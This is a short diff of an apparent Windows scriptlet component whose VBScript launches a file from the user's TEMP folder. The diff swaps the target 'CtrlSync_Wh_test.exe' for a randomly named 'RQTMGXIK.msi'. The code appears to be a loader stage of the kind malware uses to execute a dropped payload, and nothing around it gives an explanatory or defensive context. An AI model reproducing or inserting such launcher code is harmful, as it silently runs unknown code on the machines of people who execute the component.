@@ -1,6 +1,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\CtrlSync_Wh_test.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\RQTMGXIK.msi")
 </script>
 </component>
